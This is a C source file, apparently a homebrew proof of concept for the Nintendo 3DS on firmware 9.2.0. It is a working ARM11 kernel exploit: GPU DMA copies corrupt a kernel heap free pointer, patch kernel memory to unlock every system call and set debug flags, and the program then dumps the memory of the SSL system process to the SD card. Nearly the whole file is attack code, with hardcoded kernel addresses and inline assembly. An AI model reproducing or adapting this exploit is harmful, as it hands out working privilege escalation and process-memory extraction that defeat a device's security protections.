/* Requires firmware 9.2.0. Only tested with 9.2.0-20E.
 *
 * Adapted from:
 * https://gbatemp.net/threads/how-to-spoof-firmware-to-access-eshop-and-more-on-new-3ds.386591/
 * https://github.com/yuriks/bootstrap/tree/debug-flag
 * https://github.com/yuriks/3ds-demos/blob/master/source/main.cpp
 */

#ifndef __PIE__
#error "Must compile with -fPIE"
#endif

/* Target TID whose memory to dump.
 *
 * Here: SSL (EU)
 */
#define TARGET_TID	0x0004013000002f02

#include "fs.h"
#include "types.h"
#include "svc.h"

int (*memcpy)(void *dst, const void *src, unsigned int len) = 0x0023FF9C;
int (*GX_SetTextureCopy)(void *input_buffer, void *output_buffer, unsigned int size, int in_x, int in_y, int out_x, int out_y, int flags) = 0x0011DD48;
int (*GSPGPU_FlushDataCache)(void *addr, unsigned int len) = 0x00191504;
int (*svcSleepThread)(unsigned long long nanoseconds) = 0x0023FFE8;
int (*svcControlMemory)(void **outaddr, unsigned int addr0, unsigned int addr1, unsigned int size, int operation, int permissions) = 0x001431A0;

int uvl_entry();

int __attribute__ ((section (".text.start"), naked)) uvl_start()
{
	asm volatile (".word 0xE1A00000");
	uvl_entry();
	asm volatile ("bx lr");
}

void do_gshax_copy(void *dst, void *src, unsigned int len)
{
	unsigned int i = 5;

	do
	{
		memcpy((void *)0x18401000, (const void *)0x18401000, 0x10000);
		GSPGPU_FlushDataCache(src, len);
		// src always 0x18402000
		GX_SetTextureCopy((void *)src, (void *)dst, len, 0, 0, 0, 0, 8);
		GSPGPU_FlushDataCache((void *)0x18401000, 16);
		GX_SetTextureCopy(dst, (void *)0x18401000, 0x40, 0, 0, 0, 0, 8);
		memcpy((void *)0x18401000, (const void *)0x18401000, 0x10000);
	} while (--i > 0);
}

void arm11_kernel_exploit_setup(void)
{
	unsigned int patch_addr;
	unsigned int *arm11_buffer = (unsigned int *)0x18402000;
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	int model;
	patch_addr = 0xDFF83837;

	// Part 1: corrupt kernel memory
	unsigned int mem_hax_mem;
	svcControlMemory(&mem_hax_mem, 0, 0, 0x6000, 0x10003, 1 | 2);

	unsigned int tmp_addr;
	svcControlMemory(&tmp_addr, mem_hax_mem + 0x4000, 0, 0x1000, 1, 0); // free page
	svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x2000, 1, 0); // free page

	unsigned int saved_heap_3[8];
	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x1000, 0x20u);
	memcpy(saved_heap_3, arm11_buffer, sizeof(saved_heap_3));

	unsigned int saved_heap_2[8];
	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x4000, 0x20u);
	memcpy(saved_heap_2, arm11_buffer, sizeof(saved_heap_2));

	svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x2000, 0x10003, 1 | 2);
	svcControlMemory(&tmp_addr, mem_hax_mem + 0x2000, 0, 0x1000, 1, 0); // free page

	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x2000, 0x20u);

	unsigned int saved_heap[8];
	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));

	arm11_buffer[0] = 1;
	arm11_buffer[1] = patch_addr;
	arm11_buffer[2] = 0;
	arm11_buffer[3] = 0;

	// Overwrite free pointer
	do_gshax_copy(mem_hax_mem + 0x2000, arm11_buffer, 0x10u);

	// Trigger write to kernel
	svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x1000, 1, 0);

	memcpy(arm11_buffer, saved_heap_3, sizeof(saved_heap_3));
	do_gshax_copy(mem_hax_mem + 0x1000, arm11_buffer, 0x20u);
	memcpy(arm11_buffer, saved_heap_2, sizeof(saved_heap_2));
	do_gshax_copy(mem_hax_mem + 0x4000, arm11_buffer, 0x20u);

	// part 2: obfuscation or trick to clear code cache
	for (i = 0; i < 0x1000; i++) {
		arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
	}
	arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	nop_func = 0x009D2000 - 0x10000; // 0x10000 below current code
	do_gshax_copy(0x19592000 - 0x10000, arm11_buffer, 0x10000);
	nop_func();
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked)) arm11_kernel_exploit_exec(int (*func)(void))
{

	asm ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
		 "bx lr\t\n");
}

void invalidate_icache(void)
{
	asm ("mcr p15,0,%0,c7,c5,0\t\n"
		 "mcr p15,0,%0,c7,c5,4\t\n"
		 "mcr p15,0,%0,c7,c5,6\t\n"
		 "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

void invalidate_dcache(void)
{
	asm ("mcr p15,0,%0,c7,c14,0\t\n"
		 "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

int __attribute__((naked)) patch_privs(void)
{
	/* Dunno what this asm is for, but I'm sure it's important.
	 *
	 * It increases the stack pointer by eight bytes and proceeds to store
	 * registers r0-r12 and the link register on the stack.
	 */
	asm ("add sp, sp, #8\t\n"
		"stmfd sp!,{r0-r12,lr}\t\n");

	// fix up memory
	*(int*)(0xDFF83837+8) = 0x8DD00CE5;

	// give access to all SVCs
	*(int*)(0xDFF82290) = 0xE320F000;
	*(int*)(0xDFF82290+8) = 0xE320F000;

	/* Gain debug flags to read other processes.
	 *
	 * Taken from https://github.com/yuriks/bootstrap/tree/debug-flag
	 *
	 * FIXME: This line sometimes crashes the 3DS and fills both screens
	 * with red.
	 */
	*((u8*)0xFFF2D00A) |= 1;

	struct KProcess *me = *((struct KProcess**)0xFFFF9004);
	me->exheader_flags |= 0x2;

	/* Find target KProcess by going backwards until the vtable does not
	 * match the value of our process anymore.
	 *
	 * The vtable is constant between all KProcesses.
	 */
	void *vtable = me->vtable;
	struct KProcess *proc = me;
	u32 pid = 0;

	while (proc->vtable == vtable) {
		if (proc->code_set->titleid == TARGET_TID) {
			pid = proc->pid;
			break;
		}

		--proc;
	}

#if 0
	/* We break on mismatch, which means we're at -1 of the KProcess array.
	 * Add KPROC_SIZE to make up for that.
	 */
	++proc;
	for (++proc; proc->vtable == vtable; ++proc) {
		if (proc->code_set->titleid == TARGET_TID) {
			pid = proc->pid;
			break;
		}
	}
#endif

#if 0
	/* A different attempt to gain SVCs. Doesn't seem to work as expected.
	 */
	struct KThread *thread = *((struct KThread**)0xFFFF9000);

	struct SVCThreadArea *area = (struct SVCThreadArea *)((u8*)thread->svc_register_state - 0x18);
	area->svc_acl[0] = 0xFF;
	area->svc_acl[1] = 0xFF;
	area->svc_acl[2] = 0xFF;
	area->svc_acl[3] = 0xFF;
	area->svc_acl[4] = 0xFF;
	area->svc_acl[5] = 0xFF;
	area->svc_acl[6] = 0xFF;
	area->svc_acl[7] = 0xFF;
	area->svc_acl[8] = 0xFF;
	area->svc_acl[9] = 0xFF;
	area->svc_acl[10] = 0xFF;
	area->svc_acl[11] = 0xFF;
	area->svc_acl[12] = 0xFF;
	area->svc_acl[13] = 0xFF;
	area->svc_acl[14] = 0xFF;
	area->svc_acl[15] = 0xFF;
#endif

	invalidate_icache();
	invalidate_dcache();

	/* The returning code changed from the original bootstrap.
	 *
	 * We need some way to return the PID to the main program, but in kernel
	 * mode, user mode addressing doesn't work, so we can't actually access
	 * anything stored in the user mode region.
	 *
	 * Thus:
	 *
	 * 1. Copy the pid to r12.
	 * 2. Pop r0-r11 from the stack.
	 * 3. Copy r12 to r0. r0 contains the return value by convention/ABI.
	 * 4. Pop r12 and lr. The satck is now back where it was before entering
	 *    this function.
	 * 5. Return with the PID as return value.
	 */
	asm volatile (	// store pid in r12
			"movs r12, %[retval]\t\n"
			/* Pop r0-r11 from the stack (see beginning of this
			 * function.
			 * Remaining on stack: r12, lr
			 */
			"ldmfd sp!,{r0-r11}\t\n"
			// Store r12 (= pid) in r0.
			"movs r0, r12\t\n"
			/* Pop r12 and lr from the stack and decrement the stack
			 * pointer by that many bytes.
			 */
			"ldmfd sp!,{r12,lr}\t\n"
			// jump back whence we came
			"ldr pc, [sp], #4\t\n" :: [retval] "r" (pid));
}

Result get_memory_info(MemInfo *out, Handle process_handle,
		u32 current_segment_addr)
{
	PageInfo page_info;
	Result res;
	
	res = svcQueryProcessMemory(out, &page_info, process_handle,
			current_segment_addr);

	return res;
}

/* We can't rely on the stdlib, so yay for implementing our own. */
size_t strlen_(const char *s)
{
	size_t sz = 0;

	while (*s++) ++sz;

	return sz;
}

void debugOut(struct File *f, char *str)
{
	int *written = (void*)0x08F01000;

	IFile_Write(f, written, str, strlen_(str));
	svcSleepThread(0x400000LL);
}

Result dump_ram(struct File *f, u32 pid)
{
	Result res = 0;
	Handle process_handle = 0;
	Handle debug_handle = 0;
	MemInfo mem_info;
	u32 current_segment_addr = 0x00100000;
	u8 *buffer = (void*)0x18410000;

#define is_fail(x) ((x) & 0x80000000)

	if (is_fail(res = svcOpenProcess(&process_handle, pid)))
		goto clean;

	/* This freezes for some PIDs. I haven't been able to figure out which
	 * ones exactly.
	 *
	 * Confirmed to freeze: 0
	 */
	if (is_fail(res = svcDebugActiveProcess(&debug_handle, pid)))
		goto clean;

	while (true) {
		(void)get_memory_info(&mem_info, process_handle, current_segment_addr);
		if (mem_info.state == 0) {
			/* 0 means unmapped */
			break;
		}

#define CHUNK_SIZE	0x1000
		for (u32 p = 0; p < mem_info.size; p += CHUNK_SIZE) {
			(void)svcReadProcessMemory(buffer, debug_handle, current_segment_addr + p, CHUNK_SIZE);
			IFile_Write(f, (void*)0x08F01000, buffer, CHUNK_SIZE);
			svcSleepThread(0x400000LL);
		}
#undef CHUNK_SIZE

		current_segment_addr = mem_info.base_addr + mem_info.size;
	}

#undef is_fail

	res = 0;

clean:
	if (process_handle != 0)
		svcCloseHandle(process_handle);
	if (debug_handle != 0)
		svcCloseHandle(debug_handle);
	return res;
}

int uvl_entry()
{
	struct File *f = (void *)0x08F10000;
	unsigned int *written = (void *)0x08F01000;

	arm11_kernel_exploit_setup();
	s32 pid = arm11_kernel_exploit_exec(patch_privs);

	IFile_Open(f, L"dmc:/debug.bin", FILE_W);
	f->pos = 0;
	svcSleepThread(0x400000LL);

	if (pid == 0) {
		/* pid 0 means we either didn't find anything or our KProcess
		 * struct is screwed up.
		 */
		debugOut(f, sizeof(struct KProcess) == 0x268 ? "0" : "F");
		svcSleepThread(0x400000LL);
		goto end;
	}

	Result res;
	if ((res = dump_ram(f, pid)) != 0) {
		IFile_Write(f, written, &res, sizeof(res));
		svcSleepThread(0x400000LL);
	}

end:
	svcExitThread();

	return 0;
}

